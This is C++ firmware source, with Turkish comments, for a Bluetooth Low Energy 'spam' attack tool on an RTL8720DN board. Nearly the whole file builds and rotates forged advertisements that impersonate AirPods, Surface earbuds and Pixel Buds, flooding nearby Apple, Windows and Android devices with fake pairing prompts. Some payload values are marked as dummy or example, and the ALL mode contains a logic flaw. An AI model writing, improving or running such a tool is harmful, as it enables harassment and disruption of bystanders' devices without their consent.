#include "BLESpam.h"
#include "config.h"
#include <Arduino.h>
#include "debug.h"

// Include realtek BLE library headers if REAL_BLE is defined
#ifdef REAL_BLE
#include <BLE.h>
#include <BLEAdvert.h>
#include <BLEDevice.h>
#endif

static void printHex(const uint8_t* data, uint8_t len) {
    char hexBuf[128];
    int pos = 0;
    for (uint8_t i = 0; i < len && pos < (int)sizeof(hexBuf) - 4; i++) {
        pos += snprintf(hexBuf + pos, sizeof(hexBuf) - pos, "%02X ", data[i]);
    }
    DBG_PRINTF("%s\n", hexBuf);
}

BLESpam::BLESpam() :
    _running(false),
    _spamType(0), // Default to Apple
    _intervalMs(BLE_SPAM_INTERVAL),
    _lastAdvertMs(0),
    _currentVariant(0),
    _variantChangeMs(0),
    _variantDurationMs(3000), // 3 seconds
    _totalPackets(0),
    _currentPPS(0),
    _ppsCountStartMs(0),
    _ppsPacketCount(0)
{
    // Constructor: Tüm durumları başlatır.
}

void BLESpam::begin() {
    // begin(): BLE donanımını başlatır.
#ifdef REAL_BLE
    DBG_PRINTF("BLESpam::begin() - Gercek BLE baslatiliyor...\n");
    BLE.begin();
    // Cihaz adını ayarla (reklamda üzerine yazılacak)
    BLE.setDeviceName("RTL8720DN_Spammer");
    // Sadece reklamcı olarak yapılandır
    // RTL8720DN BLE API'sinde doğrudan bir setAdvertiserOnly() fonksiyonu olmayabilir.
    // Reklamı başlatmak genellikle cihazı reklamcı moduna sokar.
    // TX gücünü maksimuma ayarla
    // BLE.setTxPower(BLE_TX_POWER_MAX); // Bu fonksiyonun varlığını ve değerini kontrol etmek gerek
    DBG_PRINTF("BLESpam::begin() - Gercek BLE baslatildi.\n");
#else
    DBG_PRINTF("BLESpam::begin() - Mock BLE baslatildi.\n");
#endif
}

bool BLESpam::start() {
    // start(): Spam saldırısını başlatır.
    if (_running) {
        return false; // Zaten çalışıyorsa tekrar başlatma
    }
    _running = true;
    _lastAdvertMs = millis();
    _variantChangeMs = millis();
    _currentVariant = 0;
    _totalPackets = 0;
    _currentPPS = 0;
    _ppsCountStartMs = millis();
    _ppsPacketCount = 0;
    DBG_PRINTF("BLESpam::start() - BLE Spam baslatildi.\n");
    return true;
}

void BLESpam::stop() {
    // stop(): Spam saldırısını durdurur.
    if (!_running) {
        return;
    }
    _running = false;
#ifdef REAL_BLE
    BLE.stopAdvertising();
    DBG_PRINTF("BLESpam::stop() - Gercek BLE reklami durduruldu.\n");
#else
    DBG_PRINTF("BLESpam::stop() - Mock BLE reklami durduruldu.\n");
#endif
}

bool BLESpam::isRunning() {
    // isRunning(): Spam saldırısının çalışıp çalışmadığını döndürür.
    return _running;
}

void BLESpam::setSpamType(uint8_t type) {
    // setSpamType(): Spam türünü ayarlar (Apple, Windows, Android, veya ALL).
    if (type > 3) type = 3; // Ensure type is within valid range
    _spamType = type;
    _currentVariant = 0; // Yeni türe geçince varyantı sıfırla
    _variantChangeMs = millis(); // Varyant değişim zamanını sıfırla
    DBG_PRINTF("BLESpam::setSpamType() - Spam turu: %d\n", type);
}

void BLESpam::update() {
    // update(): Her loop() çağrısında çalıştırılmalı. Reklamları gönderir ve varyantları döngüye sokar.
    if (!_running) {
        return;
    }

    unsigned long currentMillis = millis();

    // Reklam gönderme zamanı mı?
    if (currentMillis - _lastAdvertMs >= _intervalMs) {
        _lastAdvertMs = currentMillis;

        uint8_t advertData[31];
        uint8_t advertLen = 0;

        // Mevcut spam türüne göre reklam yükünü oluştur
        switch (_spamType) {
            case 0: // Apple
                _buildApplePayload(advertData, &advertLen, (AppleVariant)_currentVariant);
                break;
            case 1: // Windows
                _buildWindowsPayload(advertData, &advertLen, (WindowsVariant)_currentVariant);
                break;
            case 2: // Android
                _buildAndroidPayload(advertData, &advertLen, (AndroidVariant)_currentVariant);
                break;
            case 3: // ALL (Döngüsel)
                // _currentVariant, her platform için kendi içinde döngüye girecek
                // _spamType'ı burada değiştirmeyeceğiz, _currentVariant'ı değiştireceğiz
                // Platform değişimi _variantDurationMs ile kontrol edilecek
                uint8_t currentPlatform = (currentMillis / _variantDurationMs) % 3; // 0, 1, 2
                switch (currentPlatform) {
                    case 0: // Apple
                        _buildApplePayload(advertData, &advertLen, (AppleVariant)_currentVariant);
                        break;
                    case 1: // Windows
                        _buildWindowsPayload(advertData, &advertLen, (WindowsVariant)_currentVariant);
                        break;
                    case 2: // Android
                        _buildAndroidPayload(advertData, &advertLen, (AndroidVariant)_currentVariant);
                        break;
                }
                break;
        }
        
        _sendAdvertisement(advertData, advertLen);
        _totalPackets++;
        _ppsPacketCount++;
    }

    // Varyant döngüsü ve platform değişimi
    if (currentMillis - _variantChangeMs >= _variantDurationMs) {
        _variantChangeMs = currentMillis; // Zamanlayıcıyı sıfırla

        if (_spamType == 3) { // ALL modunda platformlar arasında geçiş yap
            // Platformu değiştir (Apple -> Windows -> Android -> Apple...)
            uint8_t currentPlatform = (currentMillis / _variantDurationMs) % 3; // 0, 1, 2
            _spamType = currentPlatform; // _spamType'ı gerçekten değiştir
            _currentVariant = 0; // Yeni platform için varyantı sıfırla
        } else { // Belirli bir platform modunda varyantlar arasında geçiş yap
            _currentVariant++;
            switch (_spamType) {
                case 0: // Apple
                    if (_currentVariant >= APPLE_AIRPODS_COUNT) _currentVariant = 0;
                    break;
                case 1: // Windows
                    if (_currentVariant >= WINDOWS_COUNT) _currentVariant = 0;
                    break;
                case 2: // Android
                    if (_currentVariant >= ANDROID_COUNT) _currentVariant = 0;
                    break;
            }
        }
        DBG_PRINTF("BLESpam::update() - Varyant: %s (%d)\n", _getVariantName(), _currentVariant);
    }

    // PPS hesaplama
    if (currentMillis - _ppsCountStartMs >= 1000) {
        _currentPPS = _ppsPacketCount;
        _ppsPacketCount = 0;
        _ppsCountStartMs = currentMillis;
    }
}

void BLESpam::setInterval(uint16_t intervalMs) {
    // setInterval(): Reklam patlamaları arasındaki süreyi ayarlar.
    _intervalMs = intervalMs;
    DBG_PRINTF("BLESpam::setInterval() - Aralik: %d ms\n", intervalMs);
}

uint32_t BLESpam::getPacketsSent() {
    // getPacketsSent(): Gönderilen toplam paket sayısını döndürür.
    return _totalPackets;
}

uint16_t BLESpam::getPacketsPerSecond() {
    // getPacketsPerSecond(): Saniyede gönderilen paket sayısını döndürür.
    return _currentPPS;
}

// --- Reklam Yükü Oluşturma Fonksiyonları ---

void BLESpam::_buildApplePayload(uint8_t* buffer, uint8_t* length, AppleVariant variant) {
    // _buildApplePayload(): Apple AirPods reklam yükünü oluşturur.
    uint8_t offset = 0;
    const char* deviceName = "";
    uint8_t manufacturerData[10]; // Apple manufacturer data
    uint8_t manufacturerDataLen = 0;

    // Flags AD
    _addFlagsAD(buffer, &offset);

    // Manufacturer Specific Data (Apple Company ID: 0x004C)
    // Apple BLE format: Type (1 byte) = 0x07 (Apple Device Info), SubType (1 byte), SubType Len (1 byte)
    // AirPods Pro: SubType = 0x0A, Status = 0x10 | 0x20
    // AirPods Max: SubType = 0x0B
    manufacturerData[0] = 0x07; // Apple Device Info Type

    switch (variant) {
        case APPLE_AIRPODS_1:
            deviceName = "AirPods";
            manufacturerData[1] = 0x02; // SubType for AirPods 1/2
            manufacturerData[2] = 0x20; // Status (example)
            manufacturerDataLen = 3;
            break;
        case APPLE_AIRPODS_2:
            deviceName = "AirPods";
            manufacturerData[1] = 0x03; // SubType for AirPods 1/2
            manufacturerData[2] = 0x20; // Status (example)
            manufacturerDataLen = 3;
            break;
        case APPLE_AIRPODS_PRO:
            deviceName = "AirPods Pro";
            manufacturerData[1] = 0x0A; // SubType for AirPods Pro
            manufacturerData[2] = 0x10; // Status (example: connected, charging)
            manufacturerDataLen = 3;
            break;
        case APPLE_AIRPODS_MAX:
            deviceName = "AirPods Max";
            manufacturerData[1] = 0x0B; // SubType for AirPods Max
            manufacturerData[2] = 0x10; // Status (example)
            manufacturerDataLen = 3;
            break;
        default:
            deviceName = "AirPods";
            manufacturerData[1] = 0x02;
            manufacturerData[2] = 0x20;
            manufacturerDataLen = 3;
            break;
    }
    _addManufacturerAD(buffer, &offset, 0x004C, manufacturerData, manufacturerDataLen);

    // Device Name AD
    _addNameAD(buffer, &offset, deviceName);

    *length = offset;
        DBG_PRINTF("BLESpam: Apple Payload (%s) - Len: %d\n", deviceName, *length);
#ifndef REAL_BLE
    printHex(buffer, *length);
#endif
}

void BLESpam::_buildWindowsPayload(uint8_t* buffer, uint8_t* length, WindowsVariant variant) {
    // _buildWindowsPayload(): Windows Swift Pair reklam yükünü oluşturur.
    uint8_t offset = 0;
    const char* deviceName = "";
    uint8_t manufacturerData[5]; // Microsoft manufacturer data
    uint8_t manufacturerDataLen = 0;

    // Flags AD
    _addFlagsAD(buffer, &offset);

    // Manufacturer Specific Data (Microsoft Company ID: 0x0006)
    // Microsoft Swift Pair format: Frame Type (1 byte), Beacon Period (2 bytes), Reserved (2 bytes)
    // Frame Type = 0x01 (Swift Pair)
    // Beacon Period: little-endian, e.g., 0x80 0x0C (320ms)
    manufacturerData[0] = 0x01; // Frame Type: Swift Pair
    manufacturerData[1] = 0x80; // Beacon Period (LSB)
    manufacturerData[2] = 0x0C; // Beacon Period (MSB) - 0x0C80 = 3200 decimal
    manufacturerData[3] = 0x00; // Reserved
    manufacturerData[4] = 0x00; // Reserved
    manufacturerDataLen = 5;

    switch (variant) {
        case WINDOWS_SURFACE_EARBUDS:
            deviceName = "Surface Earbuds";
            break;
        case WINDOWS_SURFACE_HEADPHONES:
            deviceName = "Surface Headphones 2";
            break;
        default:
            deviceName = "Surface Earbuds";
            break;
    }
    _addManufacturerAD(buffer, &offset, 0x0006, manufacturerData, manufacturerDataLen);

    // Device Name AD
    _addNameAD(buffer, &offset, deviceName);

    *length = offset;
        DBG_PRINTF("BLESpam: Windows Payload (%s) - Len: %d\n", deviceName, *length);
#ifndef REAL_BLE
    printHex(buffer, *length);
#endif
}

void BLESpam::_buildAndroidPayload(uint8_t* buffer, uint8_t* length, AndroidVariant variant) {
    // _buildAndroidPayload(): Android Fast Pair reklam yükünü oluşturur.
    uint8_t offset = 0;
    const char* deviceName = "";
    uint8_t manufacturerData[5]; // Google manufacturer data (TX Power + Model ID)
    uint8_t manufacturerDataLen = 0;

    // Flags AD
    _addFlagsAD(buffer, &offset);

    // Manufacturer Specific Data (Google Company ID: 0x00E0)
    // Google Fast Pair format: TX Power (1 byte), Model ID (3 bytes), Account Key (varies)
    // Model ID: 3 bytes little-endian
    manufacturerData[0] = 0xF8; // Example TX Power (arbitrary value)

    switch (variant) {
        case ANDROID_PIXEL_BUDS:
            deviceName = "Pixel Buds";
            // Example Model ID for Pixel Buds (dummy)
            manufacturerData[1] = 0x11;
            manufacturerData[2] = 0x22;
            manufacturerData[3] = 0x33;
            break;
        case ANDROID_PIXEL_BUDS_PRO:
            deviceName = "Pixel Buds Pro";
            // Example Model ID for Pixel Buds Pro (dummy)
            manufacturerData[1] = 0x44;
            manufacturerData[2] = 0x55;
            manufacturerData[3] = 0x66;
            break;
        default:
            deviceName = "Pixel Buds";
            manufacturerData[1] = 0x11;
            manufacturerData[2] = 0x22;
            manufacturerData[3] = 0x33;
            break;
    }
    manufacturerDataLen = 4; // TX Power + 3 bytes Model ID
    _addManufacturerAD(buffer, &offset, 0x00E0, manufacturerData, manufacturerDataLen);

    // Device Name AD
    _addNameAD(buffer, &offset, deviceName);

    *length = offset;
        DBG_PRINTF("BLESpam: Android Payload (%s) - Len: %d\n", deviceName, *length);
#ifndef REAL_BLE
    printHex(buffer, *length);
#endif
}

// --- Generic BLE AD Yapısı Yardımcı Fonksiyonları ---

void BLESpam::_addAD(uint8_t* buffer, uint8_t* offset, uint8_t adType, const uint8_t* data, uint8_t dataLen) {
    // _addAD(): Genel bir BLE Reklam Verisi (AD) elemanı ekler.
    uint8_t len = dataLen + 1; // Length + Type
    if (*offset + len + 1 > 31) { // Max BLE AD size is 31 bytes
        DBG_PRINTF("BLESpam: Reklam verisi boyutu asildi!\n");
        return;
    }
    buffer[(*offset)++] = len;
    buffer[(*offset)++] = adType;
    memcpy(buffer + *offset, data, dataLen);
    *offset += dataLen;
}

void BLESpam::_addFlagsAD(uint8_t* buffer, uint8_t* offset) {
    // _addFlagsAD(): Flags AD elemanını ekler (LE General Discoverable + BR/EDR not supported).
    uint8_t flags = 0x06; // LE General Discoverable Mode | BR/EDR Not Supported
    _addAD(buffer, offset, 0x01, &flags, 1); // AD Type 0x01 for Flags
}

void BLESpam::_addNameAD(uint8_t* buffer, uint8_t* offset, const char* name) {
    // _addNameAD(): Cihaz adı AD elemanını ekler.
    uint8_t nameLen = strlen(name);
    if (*offset + nameLen + 2 > 31) { // Check if name fits
        // Kısaltılmış isim kullanmayı dene
        nameLen = 31 - (*offset + 2); // Kalan alana sığacak kadar kısalt
        if (nameLen <= 0) return;
        _addAD(buffer, offset, 0x08, (const uint8_t*)name, nameLen); // Shortened Local Name
    } else {
        _addAD(buffer, offset, 0x09, (const uint8_t*)name, nameLen); // Complete Local Name
    }
}

void BLESpam::_addManufacturerAD(uint8_t* buffer, uint8_t* offset, uint16_t companyId, const uint8_t* data, uint8_t dataLen) {
    // _addManufacturerAD(): Üreticiye özel AD elemanını ekler.
    uint8_t manufacturerData[dataLen + 2]; // 2 bytes for Company ID
    manufacturerData[0] = (uint8_t)(companyId & 0xFF); // Company ID LSB
    manufacturerData[1] = (uint8_t)((companyId >> 8) & 0xFF); // Company ID MSB
    memcpy(manufacturerData + 2, data, dataLen);
    _addAD(buffer, offset, 0xFF, manufacturerData, dataLen + 2); // AD Type 0xFF for Manufacturer Specific Data
}

// --- Reklam Gönderme Fonksiyonu ---

void BLESpam::_sendAdvertisement(const uint8_t* data, uint8_t length) {
    // _sendAdvertisement(): Ham BLE reklamını gönderir.
#ifdef REAL_BLE
    // Mevcut reklamı durdur
    BLE.stopAdvertising();

    // Yeni reklam verisini ayarla
    BLEAdvertising advert;
    advert.setAdvertisementData(data, length);

    // Reklamı yeniden başlat
    BLE.startAdvertising(&advert);
    DBG_PRINTF("BLESpam: Gercek BLE reklami. Uzunluk: %d\n", length);
#else
    DBG_PRINTF("BLESpam: Mock reklam. Uzunluk: %d, Varyant: %s\n", length, _getVariantName());
    DBG_PRINTF("  Veri: ");
    printHex(data, length);
#endif
}

// --- Varyant Adı Fonksiyonu ---

const char* BLESpam::_getVariantName() {
    // _getVariantName(): Mevcut varyantın adını döndürür (hata ayıklama için).
    switch (_spamType) {
        case 0: // Apple
            switch ((AppleVariant)_currentVariant) {
                case APPLE_AIRPODS_1: return "Apple AirPods 1";
                case APPLE_AIRPODS_2: return "Apple AirPods 2";
                case APPLE_AIRPODS_PRO: return "Apple AirPods Pro";
                case APPLE_AIRPODS_MAX: return "Apple AirPods Max";
                default: return "Apple Unknown";
            }
        case 1: // Windows
            switch ((WindowsVariant)_currentVariant) {
                case WINDOWS_SURFACE_EARBUDS: return "Windows Surface Earbuds";
                case WINDOWS_SURFACE_HEADPHONES: return "Windows Surface Headphones";
                default: return "Windows Unknown";
            }
        case 2: // Android
            switch ((AndroidVariant)_currentVariant) {
                case ANDROID_PIXEL_BUDS: return "Android Pixel Buds";
                case ANDROID_PIXEL_BUDS_PRO: return "Android Pixel Buds Pro";
                default: return "Android Unknown";
            }
        case 3: { // ALL (Dongusel)
            uint8_t currentPlatform = (millis() / _variantDurationMs) % 3;
            switch (currentPlatform) {
                case 0: return "ALL (Apple)";
                case 1: return "ALL (Windows)";
                case 2: return "ALL (Android)";
                default: return "ALL (Unknown)";
            }
        }
        default: return "Unknown Spam Type";
    }
}
